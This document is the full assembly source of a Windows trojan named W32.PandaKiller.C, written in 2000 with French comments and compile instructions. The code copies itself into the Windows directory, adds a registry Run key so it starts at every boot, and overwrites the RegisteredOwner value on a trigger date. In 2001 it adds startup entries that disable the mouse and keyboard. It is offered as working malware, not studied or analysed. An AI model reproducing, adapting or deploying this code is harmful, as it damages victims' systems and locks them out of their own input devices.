comment $

            ***   **  *  * ***   **   *  * * *    *    **** ***
            *  * *  * ** * *  * *  *  * *  * *    *    *    *  *
            *  * *  * ** * *  * *  *  **   * *    *    **   *  *
            * *  **** * ** *  * ****  **   * *    *    *    ***
            *    *  * * ** *  * *  *  * *  * *    *    *    * *
            *    *  * *  * ***  *  *  *  * * **** **** **** *  *

            W32.PandaKiller.C par PandaKiller le 17 octobre 2000


S'AUTO-COPIE DANS     : - %windir%\WinExec.exe

DESCRIPTION : 5/12 : Nom d'enregistrement : PandaKiller
              2001 : D‚sactive clavier et souris

POUR COMPILER:

tasm32 /M /ML PandaKiller3.asm
tlink32 -Tpe -x -aa PandaKiller3.obj,,,import32

$

jumps
locals
.386
.model flat

extrn GetModuleHandleA:PROC
extrn GetModuleFileNameA:PROC
extrn GetWindowsDirectoryA:PROC
extrn CopyFileA:PROC
extrn lstrcat:PROC
extrn RegCreateKeyExA:PROC
extrn RegSetValueExA:PROC
extrn RegCloseKey:PROC
extrn GetSystemTime:PROC
extrn MessageBoxA:PROC
extrn ExitProcess:PROC

.data
moi     dd 260 dup (0)
targ1   dd 260 dup (0)
copie   db "\WinExec.exe",00h
l       dd 0
p       dd 0
CLE     db "\Software\Microsoft\Windows\CurrentVersion",00h
DONNEE  db "PandaKiller",00h
NOM     db "RegisteredOwner",00h
CLE2    db "\Software\Microsoft\Windows\CurrentVersion\Run",00h
DONNEE2 db "%windir%\WinExec.exe",00h
NOM2    db "WinExec",00h
DONNEE3 db "rundll32 mouse,disable",00h
NOM3    db "Stop1",00h
DONNEE4 db "rundll32 keyboard,disable",00h
NOM4    db "Stop2",00h
TITRE   db "T.PK.3",00h
TEXTE   db "VOUS SOUHAITE UNE BONNE ANNEE !",00h

SYSTIME struct
wYear           WORD ?
wMonth          WORD ?
wDayOfWeek      WORD ?
wDay            WORD ?
wHour           WORD ?
wMinute         WORD ?
wsecond         WORD ?
wMilliseconds   WORD ?
SYSTIME ends
SystemTime SYSTIME <>

.code
DEBUT:
AUTO_COPIE:
        push 00000000h
        call GetModuleHandleA
        push 260
        push offset moi
        push eax
        call GetModuleFileNameA
        push 260
        push offset targ1
        call GetWindowsDirectoryA
        push offset copie
        push offset targ1
        call lstrcat
        push 00000000h
        push offset targ1
        push offset moi
        call CopyFileA                  ;%windir%\WinExec.exe

        push offset l
        push offset p
        push 0
        push 1F0000h + 1 + 2h
        push 0
        push 0
        push 0
        push offset CLE2
        push 80000002h                  ;HKEY_LOCAL_MACHINE
        call RegCreateKeyExA
        push 05h
        push offset DONNEE2             ;%windir%\WinExec.exe
        push 01h
        push 0
        push offset NOM2
        push p
        call RegSetValueExA             ;CREE UNE VALEUR 
        push 0
        call RegCloseKey                ;FERME LA BASE DE REGISTRE

HEURE:  push offset SystemTime
        call GetSystemTime
        cmp  [SystemTime.wMonth],0Ch
        jne  HEURE2
        cmp  [SystemTime.wDay],05h
        jne  HEURE2

REGISTRE:
        push offset l
        push offset p
        push 0
        push 1F0000h + 1 + 2h
        push 0
        push 0
        push 0
        push offset CLE
        push 80000002h                  ;HKEY_LOCAL_MACHINE
        call RegCreateKeyExA
        push 05h
        push offset DONNEE              ;PandaKiller
        push 01h
        push 0
        push offset NOM                 ;DANS RegisteredOwner
        push p
        call RegSetValueExA             ;CREE UNE VALEUR 
        push 0
        call RegCloseKey                ;FERME LA BASE DE REGISTRE

HEURE2: push offset SystemTime
        call GetSystemTime
        cmp  [SystemTime.wYear],7D1h
        jne FIN

REGISTRE2:
        push offset l
        push offset p
        push 0
        push 1F0000h + 1 + 2h
        push 0
        push 0
        push 0
        push offset CLE2
        push 80000002h                  ;HKEY_LOCAL_MACHINE
        call RegCreateKeyExA
        push 05h
        push offset DONNEE3             ;mouse,disable
        push 01h
        push 0
        push offset NOM3
        push p
        call RegSetValueExA             ;CREE UNE VALEUR
        push offset l
        push offset p
        push 0
        push 1F0000h + 1 + 2h
        push 0
        push 0
        push 0
        push offset CLE2
        push 80000002h                  ;HKEY_LOCAL_MACHINE
        call RegCreateKeyExA
        push 05h
        push offset DONNEE4             ;keyboard,disable
        push 01h
        push 0
        push offset NOM4                 
        push p
        call RegSetValueExA             ;CREE UNE VALEUR
        push 0
        call RegCloseKey

MESSAGE:push 40h
        push offset TITRE
        push offset TEXTE
        push 0
        call MessageBoxA
FIN:
        push 0
        call ExitProcess

end DEBUT
